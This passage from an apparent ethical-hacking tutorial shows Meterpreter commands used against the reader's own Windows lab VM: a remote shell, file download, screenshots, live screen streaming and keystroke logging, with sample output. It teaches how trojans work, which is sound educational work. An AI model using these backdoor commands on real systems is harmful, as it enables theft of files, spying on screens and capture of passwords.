    \ they can maintain control of the target machine.\n\n## Downloading Files from\
    \ the Victim Computer\n\nThe `download` command in Meterpreter allows you to download\
    \ a file from the victim computer. To try it out, we’ll create a sample text file\
    \ on the Windows VM and then steal it.\n\n1. Enter this command at the `meterpreter\
    \ >` prompt to take remote control of the victim computer’s Windows command line\
    \ terminal, or `shell`.\n\n```\nmeterpreter > shell\nProcess 4952 created.\nChannel\
    \ 1 created.\nMicrosoft Windows [Version 10.0.17763.379]\n(c) 2018 Microsoft Corporation.\
    \ All rights reserved.\n```\n\n2. Now create a file named `hacked.txt` that contains\
    \ the text “You’ve been hacked!”\n\n```\nC:\\Users\\IEUser\\Documents> echo \"\
    You've been hacked!\" > hacked.txt\necho \"You've been hacked!\" > hacked.txt\n\
    ```\n\n3. Check the `Documents` folder on the Windows VM. You should see the `hacked.txt`\
    \ file that we just created remotely from Kali.\n\n4. Back in Kali, exit the Windows\
    \ shell and return to Meterpreter:\n\n```\nC:\\Users\\IEUser\\Documents> exit\n\
    exit\n```\n\n5. Now download the file from Windows onto your Kali VM:\n\n```\n\
    meterpreter > download hacked.txt\n[*] Downloading: hacked.txt -> hacked.txt\n\
    [*] Downloaded 24.00 B of 24.00 B (100.0%): hacked.txt -> hacked.txt\n[*] download\
    \   : hacked.txt -> hacked.txt\n```\n\n6. Finally, use the following command to\
    \ view the file’s contents, our “You’ve been hacked!” message.\n\n```\nmeterpreter\
    \ > cat hacked.txt\n\"You've been hacked!\"\n```\n\nWe have successfully downloaded\
    \ a file from the victim’s computer! In this case, it was a file that we created\
    \ (remotely) from our attacking VM, but a real attacker could download much more\
    \ important information. Any files the Windows user has access to become downloadable\
    \ by the attacker when the Windows user runs the Meterpreter trojan: customer\
    \ lists, family photos, budget spreadsheets, tax forms, bank statements, employee\
    \ data, medical records, valuable intellectual property, or sensitive files of\
    \ `any` kind can be stolen with just a few keystrokes.\n\n## Viewing the Victim\
    \ Computer’s Screen\n\nTrojans like the Meterpreter shell are often called `backdoors`\
    \ because they give the attacker access to your computer in a way that bypasses\
    \ all your other security measures (including logging in). It’s like sneaking\
    \ in through the back door of a movie theater. When you clicked the Meterpreter\
    \ trojan file on your Windows VM, you opened a secret door into your computer\
    \ that allowed us to upload and download files. But it gets worse: you’ve given\
    \ our attacking VM a backdoor to view your computer screen, record your keystrokes,\
    \ and even turn on your webcam! To prove it, we’ll try viewing the Windows VM’s\
    \ screen from within Kali.\n\n1. Enter `screenshot -v true` into the Meterpreter\
    \ shell. With this command, an attacker can find out what the user of the victim\
    \ machine is seeing.\n\n```\nmeterpreter > screenshot -v true\nScreenshot saved\
    \ to: /home/kali/Desktop/kYpTvFbl.jpeg \n```\n\n2. A window should pop up showing\
    \ a screenshot from the Windows VM, as shown in [Figure 6-7](#c06.xhtml#figure6-7).\n\
    \n![Figure 6-7: Capturing a screenshot from the Windows VM](image_fi/502000c06/f06007.png)\n\
    \nFigure 6-7: Capturing a screenshot from the Windows VM\n\n3. You might even\
    \ be able to take it one step further and spy on the user’s computer screen in\
    \ real time. In Meterpreter, enter the `screenshare` command:\n\n```\nmeterpreter\
    \ > screenshare\n[*] Preparing player...\n[*] Opening player at:  /home/kali/oDgBGMiY.html\n\
    [*] Streaming...\n```\n\nThis command doesn’t always work, and it may slow both\
    \ your VMs (and your host computer) to a crawl because it attempts to stream real-time\
    \ video of the Windows 10 VM’s computer screen over the virtual network to the\
    \ Kali VM. But if it does work, you’ll see the Windows 10 VM’s desktop through\
    \ a browser window in Kali, as shown in [Figure 6-8](#c06.xhtml#figure6-8).\n\n\
    4. Switch over to your Windows VM and move some files or windows around, empty\
    \ the Recycle Bin, or open a web page. If you have multiple monitors or enough\
    \ room to show both VMs, you can watch everything you do in the Windows VM through\
    \ the streaming video in the browser in Kali. Creepy, right?\n\n5. Click back\
    \ into the Meterpreter terminal window in Kali and press CTRL-C to stop the screenshare.\n\
    \n![Figure 6-8: The `screenshare` command lets an attacker on Kali spy on your\
    \ Windows desktop over the internet.](image_fi/502000c06/f06008.png)\n\nFigure\
    \ 6-8: The `screenshare` command lets an attacker on Kali spy on your Windows\
    \ desktop over the internet.\n\n## Logging Keystrokes\n\nOnce in control of a\
    \ machine, an attacker can log the user’s every keystroke. This gives the attacker\
    \ a record of what the user is typing, including searches, commands, passwords,\
    \ and more. Let’s see how it works.\n\n1. Type `keyscan_start` into the Meterpreter\
    \ shell to begin recording keystrokes from the target computer:\n\n```\nmeterpreter\
    \ > keyscan_start\nStarting the keystroke sniffer ...\n```\n\n2. Switch back to\
    \ your Windows VM, enter `notepad` in the search bar, and open the Notepad app.\n\
    \n3. Enter this information into Notepad:\n\n```\nMy credit card number is not\
    \ 1111 1111 1111 1111with an expiration of 11/2028and a cvv of 111\n```\n\nOf\
    \ course, you should never store sensitive information like this in plaintext\
    \ on your computer, but many people in the world do.\n\n4. Switch back over to\
    \ the Kali VM and enter `keyscan_dump` to view the logged keystrokes:\n\n```\n\
    meterpreter > keyscan_dump\nDumping captured keystrokes...\nnotepad<CR>\n<Shift>My\
    \ credit card number is not 1111 1111 1111 1111<CR>\nwith an expiration of 11/2028<CR>\n\
    and a cvv of 111<CR>\n```\n"
